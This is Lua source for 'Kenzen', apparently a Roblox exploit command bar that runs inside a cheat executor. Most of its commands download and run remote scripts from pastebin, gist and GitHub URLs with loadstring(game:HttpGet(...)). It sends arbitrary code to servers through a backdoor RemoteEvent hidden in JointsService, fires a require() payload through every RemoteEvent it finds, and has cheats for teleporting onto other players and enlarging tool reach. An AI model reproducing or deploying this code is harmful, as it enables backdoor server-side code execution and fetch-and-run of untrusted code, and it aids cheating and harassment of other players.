print("Kenzen // V: " .. 1 .. "." .. 5 .. "." .. 0)
--= Start Up =--
if _G.KenzenLoaded then error("kenzen already running") return end
_G.KenzenLoaded = true
if not game:IsLoaded() then game.Loaded:Wait() end
--= Variables =--
local UserInput = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Player = game.Players.LocalPlayer
local password = "k" ..                                                                                                                  "e" ..                                              "k"
local passed = false
local intweeninfo,outtweeninfo = TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.In),TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
local commands = {"dqqs","fps","antilog","boombox","hydroxide","iy","dex","serverhop","serverhop2","rejoin","nullware","owlhub","removekorblox","saveinstance","copycat","animgrabber","bang","reach","headsit","copypos"}
local executor

--= GUI =--
local ScreenGui0 = Instance.new("ScreenGui")
ScreenGui0.Name = "🖼️"
ScreenGui0.ResetOnSpawn = false
ScreenGui0.DisplayOrder = 999999999
local TextBox9 = Instance.new("TextBox")
TextBox9.Name = "Cmdbar"
TextBox9.Parent = ScreenGui0
TextBox9.Position = UDim2.new(0, 0, 0.949999988, 0)
TextBox9.Size = UDim2.new(0.0599999987, 100, 0.0299999993, 0)
TextBox9.AnchorPoint = Vector2.new(0, 1)
TextBox9.BackgroundColor = BrickColor.new("Black")
TextBox9.BackgroundColor3 = Color3.new(0.172549, 0.184314, 0.2)
TextBox9.Font = Enum.Font.GothamSemibold
TextBox9.FontSize = Enum.FontSize.Size14
TextBox9.Text = ""
TextBox9.TextColor = BrickColor.new("Royal purple")
TextBox9.TextColor3 = Color3.new(0.498039, 0, 0.85098)
TextBox9.TextSize = 14
TextBox9.TextWrap = true
TextBox9.TextWrapped = true
TextBox9.PlaceholderColor3 = Color3.new(0.392157, 0, 0.67451)
TextBox9.PlaceholderText = "password"
local Frame10 = Instance.new("Frame")
Frame10.Name = "Commands"
Frame10.Parent = TextBox9
Frame10.Position = UDim2.new(-1, 0, -0.100000001, 0)
Frame10.Size = UDim2.new(1, 0, 6, 0)
Frame10.AnchorPoint = Vector2.new(0, 1)
Frame10.BackgroundColor = BrickColor.new("Black")
Frame10.BackgroundColor3 = Color3.new(0.172549, 0.184314, 0.2)
Frame10.BorderSizePixel = 0
local Frame11 = Instance.new("Frame")
Frame11.Name = "Underline"
Frame11.Parent = Frame10
Frame11.Position = UDim2.new(0, 0, 1, 0)
Frame11.Size = UDim2.new(1, 0, 0, 1)
Frame11.BackgroundColor = BrickColor.new("Royal purple")
Frame11.BackgroundColor3 = Color3.new(0.498039, 0, 0.85098)
Frame11.BorderSizePixel = 0
local ScrollingFrame12 = Instance.new("ScrollingFrame")
ScrollingFrame12.Parent = Frame10
ScrollingFrame12.Size = UDim2.new(1, 0, 1, 0)
ScrollingFrame12.Active = true
ScrollingFrame12.BackgroundColor = BrickColor.new("Institutional white")
ScrollingFrame12.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame12.BackgroundTransparency = 1
ScrollingFrame12.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame12.ScrollBarThickness = 0
ScrollingFrame12.AutomaticCanvasSize = Enum.AutomaticSize.Y
local UIListLayout13 = Instance.new("UIListLayout")
UIListLayout13.Parent = ScrollingFrame12
UIListLayout13.SortOrder = Enum.SortOrder.LayoutOrder
local TextLabel14 = Instance.new("TextLabel")
TextLabel14.Parent = ScrollingFrame12
TextLabel14.Visible = false
TextLabel14.Size = UDim2.new(1, 0, 0, 15)
TextLabel14.BackgroundColor = BrickColor.new("Institutional white")
TextLabel14.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel14.BackgroundTransparency = 1
TextLabel14.Font = Enum.Font.Gotham
TextLabel14.FontSize = Enum.FontSize.Size14
TextLabel14.TextColor = BrickColor.new("Royal purple")
TextLabel14.TextColor3 = Color3.new(0.498039, 0, 0.85098)
TextLabel14.TextScaled = true
TextLabel14.TextSize = 14
TextLabel14.TextWrap = true
TextLabel14.TextWrapped = true
local Frame15 = Instance.new("Frame")
Frame15.Name = "Underline"
Frame15.Parent = TextBox9
Frame15.Position = UDim2.new(0, 0, 1, 0)
Frame15.Size = UDim2.new(1, 0, 0, 1)
Frame15.BackgroundColor = BrickColor.new("Royal purple")
Frame15.BackgroundColor3 = Color3.new(0.498039, 0, 0.85098)
Frame15.BorderSizePixel = 0

--= Functions =--
local function writefileExploit()
	if writefile then
		return true
	end
end
local function dragify(Frame)
	local frametomove = Frame
	local dragToggle,dragInput,dragStart,startPos
	local dragSpeed = 0
	local function updateInput(input)
		local Delta = input.Position - dragStart
		local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
		frametomove.Position = Position
	end
	Frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UserInput:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = input.Position
			startPos = frametomove.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	Frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInput.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end
local function loadexecutor()
	local Frame1 = Instance.new("Frame")
	local Frame2 = Instance.new("Frame")
	local TextLabel3 = Instance.new("TextLabel")
	local TextButton4 = Instance.new("TextButton")
	local TextButton5 = Instance.new("TextButton")
	local TextButton6 = Instance.new("TextButton")
	local Frame7 = Instance.new("Frame")
	local TextBox8 = Instance.new("TextBox")
	Frame1.Name = "Executor"
	Frame1.Parent = ScreenGui0
	Frame1.Position = UDim2.new(0.5, 0, 0.5, 0)
	Frame1.Visible = false
	Frame1.Size = UDim2.new(0.100000001, 200, 0.25, 0)
	Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
	Frame1.BackgroundColor = BrickColor.new("Black")
	Frame1.BackgroundColor3 = Color3.new(0.172549, 0.184314, 0.2)
	Frame1.BorderSizePixel = 0
	executor = Frame1
	Frame2.Name = "Title"
	Frame2.Parent = Frame1
	Frame2.Size = UDim2.new(1, 0, 0.100000001, 0)
	Frame2.BackgroundColor = BrickColor.new("Black")
	Frame2.BackgroundColor3 = Color3.new(0.137255, 0.152941, 0.164706)
	Frame2.BorderSizePixel = 0
	TextLabel3.Parent = Frame2
	TextLabel3.Size = UDim2.new(1, 0, 1, 0)
	TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
	TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel3.BackgroundTransparency = 1
	TextLabel3.Font = Enum.Font.GothamBold
	TextLabel3.FontSize = Enum.FontSize.Size14
	TextLabel3.Text = "Script Executor"
	TextLabel3.TextColor = BrickColor.new("Neon orange")
	TextLabel3.TextColor3 = Color3.new(0.85098, 0.462745, 0.203922)
	TextLabel3.TextSize = 14
	TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
	TextButton4.Name = "Execute"
	TextButton4.Parent = Frame1
	TextButton4.Position = UDim2.new(0.0299999993, 0, 0.949999988, 0)
	TextButton4.Size = UDim2.new(0.300000012, 0, 0.150000006, 0)
	TextButton4.AnchorPoint = Vector2.new(0, 1)
	TextButton4.BackgroundColor = BrickColor.new("Institutional white")
	TextButton4.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton4.BorderSizePixel = 0
	TextButton4.Font = Enum.Font.GothamBold
	TextButton4.FontSize = Enum.FontSize.Size14
	TextButton4.Text = "Execute"
	TextButton4.TextColor = BrickColor.new("Really black")
	TextButton4.TextColor3 = Color3.new(0, 0, 0)
	TextButton4.TextScaled = true
	TextButton4.TextSize = 14
	TextButton4.TextWrap = true
	TextButton4.TextWrapped = true
	TextButton5.Name = "Side"
	TextButton5.Parent = Frame1
	TextButton5.Position = UDim2.new(0.5, 0, 0.949999988, 0)
	TextButton5.Size = UDim2.new(0.300000012, 0, 0.150000006, 0)
	TextButton5.AnchorPoint = Vector2.new(0.5, 1)
	TextButton5.BackgroundColor = BrickColor.new("Institutional white")
	TextButton5.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton5.BorderSizePixel = 0
	TextButton5.Font = Enum.Font.GothamBold
	TextButton5.FontSize = Enum.FontSize.Size14
	TextButton5.Text = "Serverside"
	TextButton5.TextColor = BrickColor.new("Really black")
	TextButton5.TextColor3 = Color3.new(0, 0, 0)
	TextButton5.TextScaled = true
	TextButton5.TextSize = 14
	TextButton5.TextWrap = true
	TextButton5.TextWrapped = true
	TextButton6.Name = "Hide"
	TextButton6.Parent = Frame1
	TextButton6.Position = UDim2.new(0.970000029, 0, 0.949999988, 0)
	TextButton6.Size = UDim2.new(0.300000012, 0, 0.150000006, 0)
	TextButton6.AnchorPoint = Vector2.new(1, 1)
	TextButton6.BackgroundColor = BrickColor.new("Institutional white")
	TextButton6.BackgroundColor3 = Color3.new(1, 1, 1)
	TextButton6.BorderSizePixel = 0
	TextButton6.Font = Enum.Font.GothamBold
	TextButton6.FontSize = Enum.FontSize.Size14
	TextButton6.Text = "HideText"
	TextButton6.TextColor = BrickColor.new("Really black")
	TextButton6.TextColor3 = Color3.new(0, 0, 0)
	TextButton6.TextScaled = true
	TextButton6.TextSize = 14
	TextButton6.TextWrap = true
	TextButton6.TextWrapped = true
	Frame7.Name = "TextFrame"
	Frame7.Parent = Frame1
	Frame7.Position = UDim2.new(0.5, 0, 0.119999997, 0)
	Frame7.Size = UDim2.new(0.949999988, 0, 0.600000024, 0)
	Frame7.AnchorPoint = Vector2.new(0.5, 0)
	Frame7.BackgroundColor = BrickColor.new("Institutional white")
	Frame7.BackgroundColor3 = Color3.new(1, 1, 1)
	Frame7.BackgroundTransparency = 1
	TextBox8.Name = "ScriptBox"
	TextBox8.Parent = Frame7
	TextBox8.Size = UDim2.new(1, 0, 1, 0)
	TextBox8.BackgroundColor = BrickColor.new("Black")
	TextBox8.BackgroundColor3 = Color3.new(0.137255, 0.152941, 0.164706)
	TextBox8.BorderSizePixel = 0
	TextBox8.Font = Enum.Font.GothamSemibold
	TextBox8.FontSize = Enum.FontSize.Size14
	TextBox8.Text = 'print("Hello world!")'
	TextBox8.TextColor = BrickColor.new("Neon orange")
	TextBox8.TextColor3 = Color3.new(0.85098, 0.462745, 0.203922)
	TextBox8.TextSize = 14
	TextBox8.TextWrap = true
	TextBox8.TextWrapped = true
	TextBox8.TextXAlignment = Enum.TextXAlignment.Left
	TextBox8.TextYAlignment = Enum.TextYAlignment.Top
	TextBox8.MultiLine = true
	
	local function Tween(Obj, Time, Settings)	
		game:GetService("TweenService"):Create(Obj, TweenInfo.new(Time), Settings):Play()
	end
	
	local Mode = "Serverside"
	local CodeHidden = false
	local clientexecute = require(game.JointsService["⚡"]["💾"])
	TextButton6.MouseButton1Click:Connect(function()
		if CodeHidden == false then
			TextButton6.Text = "ShowText"
			Tween(TextBox8, 1, {TextTransparency = 1})
			CodeHidden = true
		elseif CodeHidden == true then
			TextButton6.Text = "HideText"
			Tween(TextBox8, 1, {TextTransparency = 0})
			CodeHidden = false
		end
	end)

	TextButton4.MouseButton1Click:Connect(function()
		if Mode == "Serverside" then
			game.JointsService:WaitForChild("⚡"):FireServer("😎", TextBox8.Text,true)
		elseif Mode == "Clientside" then
			clientexecute(TextBox8.Text)()
		end
		wait(0.2)
		Frame1.Visible = false
	end)

	TextButton5.MouseButton1Click:Connect(function()
		if Mode == "Serverside" then
			Mode = "Clientside"
		else
			Mode = "Serverside"
		end
		TextButton5.Text = Mode
	end)
	dragify(Frame1)
end
local function tweencommands(bool)
	if bool then
		local tween = TweenService:Create(Frame10, intweeninfo, {Position = UDim2.new(-1,0,-0.1,0)})
		tween:Play()
	else
		local tween = TweenService:Create(Frame10, outtweeninfo, {Position = UDim2.new(0,0,-0.1,0)})
		tween:Play()
	end
end

local function toClipboard(String)
	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if clipBoard then
		clipBoard(String)
	end
end

local function command(cmd)
	local returnvaluee = TextBox9.Text
	TextBox9.Text = ""
	local cmd2 = cmd:split(" ")
	if string.lower(cmd2[1]) == "fps" then
		loadstring(game:HttpGet('https://gist.githubusercontent.com/CenteredSniper/b84117b57dd254912c4ae6f93cff5fba/raw/cfa3a426366d767c1729c1a92411eeb22d1eca5e/gistfile1.txt'))();
	elseif string.lower(cmd2[1]) == "hydroxide" then
		local function webImport(file)
			return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format("Upbolt", "revision", file)), file .. '.lua')()
		end
		webImport("init")
		webImport("ui/main")
	elseif string.lower(cmd2[1]) == "copypos" then
		local roundedPos = math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X) .. ", " .. math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y) .. ", " .. math.round(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
		toClipboard(roundedPos)
	elseif string.lower(cmd2[1]) == "dqqs" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/QuickSwitch.lua"))()
	elseif string.lower(cmd2[1]) == "antilog" then
		loadstring(game:HttpGet('https://pastebin.com/raw/444k40vk'))();
	elseif string.lower(cmd2[1]) == "saveinstance" then
		local bool = false
		if string.lower(cmd2[2]) == "yes" or string.lower(cmd2[2]) == "true" then bool = true end
		saveinstance{noscripts = bool, mode = "optimized"}
	elseif string.lower(cmd2[1]) == "removekorblox" then
		local LP = game.Players.LocalPlayer
		local a = LP.Character:FindFirstChild("Korblox Deathspeaker Right Leg")
		if a then a:Destroy() end
		LP.CharacterAdded:Connect(function(v)
 			repeat wait() until v:FindFirstChild("Korblox Deathspeaker Right Leg")
				v:WaitForChild("Korblox Deathspeaker Right Leg"):Destroy()
		end)
	elseif string.lower(cmd2[1]) == "copycat" then
		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
		if cmd2[2] then
			local copyplr
			for _, v in pairs(game.Players:GetPlayers()) do
				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
					copyplr = v
				end
			end
			if copyplr then
				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
    					local pos = copyplr.Character.HumanoidRootPart.CFrame
					wait(tonumber(cmd2[3]) or 0)
    					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
				end)
			end
		end
	elseif string.lower(cmd2[1]) == "kenzenx" then
		local a = game.Players.LocalPlayer.PlayerGui:FindFirstChild("PlayerList",true)
			if a then
				if a.Parent:FindFirstChild("TopBar") then
					a.Parent.TextBox:CaptureFocus()
					a.Parent.TextBox.Text = ":s require(6655750685).KenzenX()"
					a.Parent.TextBox:ReleaseFocus(true)
				end
			end
		wait(1)
		local b = game.Players.LocalPlayer:FindFirstChild("Loadstring",true)
		if b then
    			for i,v in pairs(b.Parent.Parent:GetDescendants()) do
        			if v:IsA("RemoteEvent") then
            				v:FireServer("require(6655750685).KenzenX()")
       				end
    			end
		end
	elseif string.lower(cmd2[1]) == "headsit" then
		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
		if cmd2[2] then
			local copyplr
			for _, v in pairs(game.Players:GetPlayers()) do
				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
					copyplr = v
				end
			end
			if copyplr then
				game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = true
				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
					if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit == true then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = copyplr.Character.HumanoidRootPart.CFrame *CFrame.new(0,1.6,1.15)
					else
						if _G.FunyEpic then _G.FunyEpic:Disconnect() end
					end
				end)
			end
		end
	elseif string.lower(cmd2[1]) == "reach" then
		for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
		if v:IsA("Tool") then
			if cmd2[2] then
				local tonum = tonumber(cmd[2])
				currentToolSize = v.Handle.Size
				currentGripPos = v.GripPos
				local a = Instance.new("SelectionBox")
				a.Name = "SelectionBoxCreated"
				a.Parent = v.Handle
				a.Adornee = v.Handle
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(tonum,tonum,tonum)
				v.GripPos = Vector3.new(0,0,0)
				game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
			else
				currentToolSize = v.Handle.Size
				currentGripPos = v.GripPos
				local a = Instance.new("SelectionBox")
				a.Name = "SelectionBoxCreated"
				a.Parent = v.Handle
				a.Adornee = v.Handle
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(50,50,50)
				v.GripPos = Vector3.new(0,0,0)
				game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
			end
		end
		end
	elseif string.lower(cmd2[1]) == "bang" then
		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
		if cmd2[2] then
			local copyplr
			for _, v in pairs(game.Players:GetPlayers()) do
				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
					copyplr = v
				end
			end
			if copyplr then
				local bangAnim = Instance.new("Animation")
				if game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					bangAnim.AnimationId = "rbxassetid://5918726674"
				else
					bangAnim.AnimationId = "rbxassetid://148840371"
				end
				bang = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(bangAnim)
				bang:Play(.1, 1, 1)
				bang:AdjustSpeed(5)
				bangDied = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					_G.FunyEpic:Disconnect()
					bang:Stop()
					bangAnim:Destroy()
					bangDied:Disconnect()
				end)
				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = copyplr.Character.HumanoidRootPart.CFrame *CFrame.new(0,0,1)
				end)
			end
		end
	elseif string.lower(cmd2[1]) == "owlhub" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
	elseif string.lower(cmd2[1]) == "animgrabber" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BlastingStone/MyLuaStuff/master/animgrabberloader.lua"))()
	elseif string.lower(cmd2[1]) == "boombox" then
		loadstring(game:HttpGetAsync('https://riptxde.dev/u/BoomboxHubV3.lua'))()
	elseif string.lower(cmd2[1]) == "iy" then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	elseif string.lower(cmd2[1]) == "dex" then
		loadstring(game:HttpGetAsync("https://pastebin.com/raw/fPP8bZ8Z"))()
	elseif string.lower(cmd2[1]) == "nullware" then 
		loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP"))()
	elseif string.lower(cmd2[1]) == "serverhop" then
		local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/".. game.PlaceId.. "/servers/Public?sortOrder=Asc&limit=100"))
		for i,v in pairs(sl.data) do
			if v.playing ~= v.maxPlayers then
				game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
			end
		end
	elseif string.lower(cmd2[1]) == "serverhop2" then
		game:GetService('TeleportService'):Teleport(game.PlaceId, game.Players.LocalPlayer)
	elseif string.lower(cmd2[1]) == "rejoin" then
		if #game.Players:GetPlayers() <= 1 then
			wait()
			game:GetService('TeleportService'):Teleport(game.PlaceId, game.Players.LocalPlayer)
		else
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
		end
	else return returnvaluee
	end
end

--= UserInput =--
TextBox9.FocusLost:connect(function(enterPressed)
	if enterPressed then
		if passed == false then
			if TextBox9.Text == password then
					if writefileExploit() then
						if pcall(function() readfile("password.KX") end) then
							-- nothing, wtf?
						else
							warn(TextBox9.Text)
							writefile("password.KX",TextBox9.Text)
						end
					end
				passed = true
				TextBox9.PlaceholderText = "Command"; TextBox9.Text = ""
			end
		elseif passed then
			if TextBox9.Text == "cmds" or TextBox9.Text == "commands" then
				tweencommands(false)
			else
				local testc = command(TextBox9.Text)
				if testc ~= nil then
					if game.JointsService:FindFirstChild("⚡") then
						if testc == "script" or testc == "executor" then
							if executor then
								executor.Visible = true
							else
								loadexecutor()
								executor.Visible = true
							end
							
						else
							game.JointsService:WaitForChild("⚡"):FireServer(testc,"😎",false)
						end
					end
				end
				tweencommands(true)
			end
			
		end
	end
end)

game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.LeftBracket then
		if TextBox9.Position == UDim2.new(-1,0,0.95,0) then
			local tween = TweenService:Create(TextBox9,outtweeninfo, {Position = UDim2.new(0,0,0.95,0)})
			tween:Play()
		else
			local tween = TweenService:Create(TextBox9,intweeninfo, {Position = UDim2.new(-1,0,0.95,0)})
			tween:Play()
		end
	elseif inputObject.KeyCode == Enum.KeyCode.BackSlash then
		if TextBox9.Position == UDim2.new(0,0,0.95,0) then
			TextBox9:CaptureFocus()
			TextBox9.Text = ""
		end
	end 
end)

--= Other =--

syn.protect_gui(ScreenGui0); ScreenGui0.Parent = game.CoreGui

for i,v in pairs(commands) do
	local clone = TextLabel14:Clone()
	clone.Parent = ScrollingFrame12
	clone.Text = v
	clone.Visible = true
end

if game.JointsService:FindFirstChild("⚡") then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Kenzen X";
		Text = "Kenzen X was detected, injected.";
		Icon = "rbxassetid://4670964366";
		Duration = "5";
	})
	local cmds = game.JointsService["⚡"]["✨"].Value:split(" ")
	for i,v in pairs(cmds) do
		if v ~= "" then
			local clone = TextLabel14:Clone()
			clone.Visible = true
			clone.Text = v
			clone.Parent = ScrollingFrame12
			clone.TextColor3 = Color3.fromRGB(217, 118, 52)
		end
	end
end

game.JointsService.ChildAdded:Connect(function(v)
	if v.Name == "⚡" then
		wait(1)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Kenzen X";
			Text = "Kenzen X was detected, injected.";
			Icon = "rbxassetid://4670964366";
			Duration = "5";
		})
		local cmds = game.JointsService["⚡"]["✨"].Value:split(" ")
		for i,v in pairs(cmds) do
			if v ~= "" then
				local clone = TextLabel14:Clone()
				clone.Visible = true
				clone.Text = v
				clone.Parent = ScrollingFrame12
				clone.TextColor3 = Color3.fromRGB(217, 118, 52)
			end
		end
	end
end)

if writefileExploit() then
	if pcall(function() readfile("password.KX") end) then
		if readfile("password.KX") ~= nil then
			if readfile("password.KX") == password then
				passed = true
				TextBox9.PlaceholderText = "Command"; TextBox9.Text = ""
			end
		end
	end
end
